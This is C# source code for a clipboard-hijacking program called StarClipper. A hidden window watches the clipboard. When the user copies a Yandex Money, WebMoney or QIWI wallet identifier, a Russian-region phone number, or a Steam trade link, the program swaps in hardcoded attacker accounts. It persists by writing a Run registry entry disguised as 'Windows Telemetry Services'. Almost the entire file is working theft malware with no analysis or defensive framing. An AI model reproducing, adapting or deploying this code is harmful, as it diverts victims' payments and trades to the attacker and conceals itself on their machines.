using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace StarClipper
{
    class Program
    {
        static String YANDEX_MONEY = "410018266548626";
        static String WEBMONEY_WMZ = "Z057492488946 ";
        static String WEBMONEY_WMR = "R594411110980";
        static String STEAMTRADE_LINK = "https://steamcommunity.com/tradeoffer/new/?partner=885823414&token=p5tjwXqd";
        static String QIWI = "+79122276846";
        
        static List<String> Letters = new List<string>() { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z" };
        static List<String> Nums = new List<string>() { "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0" };
        static void Checker(ClipboardFormat format, object data)
        {
            try
            {
                string buffer;
                if (Clipboard.ContainsText() && Clipboard.GetText().Length > 0)
                    buffer = Clipboard.GetText();
                else
                    return;
                if (!buffer.Contains(' ') && !buffer.Contains("http") && !buffer.Contains("www"))
                {
                    if (buffer.Length >= 11 && buffer.Length <= 16 && buffer.StartsWith("410"))
                    {
                        Clipboard.SetText(YANDEX_MONEY);
                    }
                    if (buffer.Length == 12 || buffer.Length == 13)
                    {
                        if (buffer.StartsWith("R"))
                            Clipboard.SetText(WEBMONEY_WMR);
                        if (buffer.StartsWith("Z"))
                            Clipboard.SetText(WEBMONEY_WMZ);
                    }
                    if (buffer.StartsWith("+375") || buffer.StartsWith("+7") || buffer.StartsWith("+373") || buffer.StartsWith("+380") || buffer.StartsWith("+994") || (buffer.Length == 11 && buffer.StartsWith("8")) || (buffer.Length == 10 && buffer.StartsWith("9")))
                    {
                        Clipboard.SetText(QIWI);
                    }
                    if (buffer.StartsWith(@"https://steamcommunity.com/tradeoffer/new/?partner"))
                    {
                        Clipboard.SetText(STEAMTRADE_LINK);
                    }
                    
                    
                }
            }
            catch
            {

            }
        }
        
        public static bool SetAutorunValue(bool autorun)
        {
            string ExePath = Application.ExecutablePath;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            const string name = "Windows Telemetry Services";
            try
            {
                if (autorun)
                    reg.SetValue(name, ExePath);
                else
                    reg.DeleteValue(name);

                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }
    }
    public static class ClipboardMonitor
    {
        public delegate void OnClipboardChangeEventHandler(ClipboardFormat format, object data);
        public static event OnClipboardChangeEventHandler OnClipboardChange;

        public static void Start()
        {
            ClipboardWatcher.Start();
            ClipboardWatcher.OnClipboardChange += (ClipboardFormat format, object data) =>
            {
                OnClipboardChange?.Invoke(format, data);
            };
        }

        public static void Stop()
        {
            OnClipboardChange = null;
            ClipboardWatcher.Stop();
        }

        class ClipboardWatcher : Form
        {
            private static ClipboardWatcher mInstance;
            static IntPtr nextClipboardViewer;
            public delegate void OnClipboardChangeEventHandler(ClipboardFormat format, object data);
            public static event OnClipboardChangeEventHandler OnClipboardChange;
            public static void Start()
            {
                if (mInstance != null)
                    return;

                var t = new Thread(new ParameterizedThreadStart(x => Application.Run(new ClipboardWatcher())));
                t.SetApartmentState(ApartmentState.STA);
                t.Start();
            }

            public static void Stop()
            {
                mInstance.Invoke(new MethodInvoker(() =>
                {
                    ChangeClipboardChain(mInstance.Handle, nextClipboardViewer);
                }));
                mInstance.Invoke(new MethodInvoker(mInstance.Close));
                mInstance.Dispose();
                mInstance = null;
            }
            protected override void SetVisibleCore(bool value)
            {
                CreateHandle();

                mInstance = this;

                nextClipboardViewer = SetClipboardViewer(mInstance.Handle);

                base.SetVisibleCore(false);
            }

            [DllImport("User32.dll", CharSet = CharSet.Auto)]
            private static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);

            [DllImport("User32.dll", CharSet = CharSet.Auto)]
            private static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);

            [DllImport("user32.dll", CharSet = CharSet.Auto)]
            private static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);

            const int WM_DRAWCLIPBOARD = 0x308;
            const int WM_CHANGECBCHAIN = 0x030D;

            protected override void WndProc(ref Message m)
            {
                switch (m.Msg)
                {
                    case WM_DRAWCLIPBOARD:
                        ClipChanged();
                        SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);
                        break;

                    case WM_CHANGECBCHAIN:
                        if (m.WParam == nextClipboardViewer)
                            nextClipboardViewer = m.LParam;
                        else
                            SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);
                        break;

                    default:
                        base.WndProc(ref m);
                        break;
                }
            }

            static readonly string[] formats = Enum.GetNames(typeof(ClipboardFormat));

            private void ClipChanged()
            {
                IDataObject iData = Clipboard.GetDataObject();

                ClipboardFormat? format = null;

                foreach (var f in formats)
                {
                    if (iData.GetDataPresent(f))
                    {
                        format = (ClipboardFormat)Enum.Parse(typeof(ClipboardFormat), f);
                        break;
                    }
                }
                object data = iData.GetData(format.ToString());

                if (data == null || format == null)
                    return;

                OnClipboardChange?.Invoke((ClipboardFormat)format, data);
            }
        }
    }

    public enum ClipboardFormat : byte
    {
        Text,
        UnicodeText,
        Dib,
        Bitmap,
        EnhancedMetafile,
        MetafilePict,
        SymbolicLink,
        Dif,
        Tiff,
        OemText,
        Palette,
        PenData,
        Riff,
        WaveAudio,
        FileDrop,
        Locale,
        Html,
        Rtf,
        CommaSeparatedValue,
        StringFormat,
        Serializable,
    }
}
